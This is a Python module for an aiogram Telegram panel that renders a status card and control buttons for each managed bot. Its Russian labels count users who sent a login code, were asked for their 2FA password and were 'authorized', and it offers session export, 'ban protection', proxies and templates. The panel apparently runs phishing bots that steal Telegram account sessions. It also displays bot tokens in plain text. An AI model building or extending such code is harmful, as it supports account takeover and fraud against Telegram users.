from __future__ import annotations

from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils.keyboard import InlineKeyboardBuilder

from database import (
    direct_link_enabled,
    get_auth_event_counts,
    get_bot_sessions_count,
    get_launch_stats,
    get_miniapp_launch_count,
    get_proxy,
    get_template,
)
from templates import template_name

def _bot_template_name(bot: dict) -> str:
    tid = bot.get("template_id")
    if tid:
        t = get_template(tid)
        if t:
            return t["name"]
    return template_name(bot.get("template"))

def _bot_stats_lines(tg_id) -> list[str]:
    header = "📊 <b>Статистика</b>"
    try:
        if tg_id:
            stats = get_launch_stats(tg_id)
            miniapp_total = get_miniapp_launch_count(tg_id)
            auth = get_auth_event_counts(tg_id)
            sessions_total = get_bot_sessions_count(tg_id)
        else:
            stats = {"total": 0, "unique": 0}
            miniapp_total = 0
            auth = {"code_sent": 0, "pwd_requested": 0, "success": 0}
            sessions_total = 0
    except Exception:
        # Транзиентный сбой БД (реконнект пула) — не роняем карточку.
        return [header, "временно недоступна — нажмите 🔄 Обновить"]
    return [
        header,
        f"Запусков: <b>{stats['total']}</b>",
        f"Запусков мини-апп: <b>{miniapp_total}</b>",
        f"Отправили код: <b>{auth['code_sent']}</b>",
        f"Запросили 2фа: <b>{auth['pwd_requested']}</b>",
        f"Авторизаций: <b>{auth['success']}</b>",
        f"Сессии: <b>{sessions_total}</b>",
        f"Уникальных юзеров: <b>{stats['unique']}</b>",
    ]

def render_bot_card(bot: dict) -> tuple[str, InlineKeyboardMarkup]:
    username = bot["username"] or "—"
    miniapp = direct_link_enabled(bot.get("tg_id"))

    lines = [
        f"🤖 Бот: <b>{username}</b>",
        f"🔑 Токен: <code>{bot['token']}</code>",
        f"📋 Шаблон: {_bot_template_name(bot)}",
        "",
    ]
    if bot.get("guard_enabled"):
        clean = username.lstrip("@")
        link = f"https://t.me/{clean}?start={bot.get('user_secret')}"
        lines.append("🛡 Включена защита от бана!")
        lines.append(f"🔥 Ссылка для юзера: {link}")
        lines.append("")
    lines.append(f"💎 Мини-апп: {'Включено' if miniapp else 'Выключено'}")

    pid = bot.get("proxy_id")
    if pid:
        try:
            p = get_proxy(pid)
        except Exception:
            p = None
        if p:
            lines.append(f"🌐 Прокси: {p.get('geo') or 'гео не определено'}")
        else:
            lines.append("🌐 Прокси: задан")
    else:
        lines.append("🌐 Прокси: нет")

    stats_lines = _bot_stats_lines(bot.get("tg_id"))
    if stats_lines:
        lines.append("")
        lines.extend(stats_lines)

    text = "\n".join(lines)

    bid = bot["id"]
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="🔄 Обновить статистику", callback_data=f"bot_refresh:{bid}"
        )
    )
    builder.row(
        InlineKeyboardButton(text="🔌 Перезапуск", callback_data=f"bot_restart:{bid}"),
        InlineKeyboardButton(text="🔥 Защита от бана", callback_data=f"guard:{bid}"),
    )
    builder.row(
        InlineKeyboardButton(text="📨 Рассылка", callback_data=f"broadcast:{bid}"),
        InlineKeyboardButton(text="📈 Статистика", callback_data=f"stats:{bid}"),
    )
    builder.row(
        InlineKeyboardButton(text="📥 Выгрузить сессии", callback_data=f"export_sessions:{bid}")
    )
    builder.row(
        InlineKeyboardButton(text="📋 Изменить шаблон", callback_data=f"template:{bid}")
    )
    builder.row(
        InlineKeyboardButton(text="⚙️ Настройки", callback_data=f"settings:{bid}")
    )
    builder.row(
        InlineKeyboardButton(text="🗑 Удалить", callback_data=f"bot_delete:{bid}"),
        InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu"),
    )
    return text, builder.as_markup()

def owns(user_id: int, bot: dict | None) -> bool:
    return bool(bot and bot["owner_id"] == user_id)
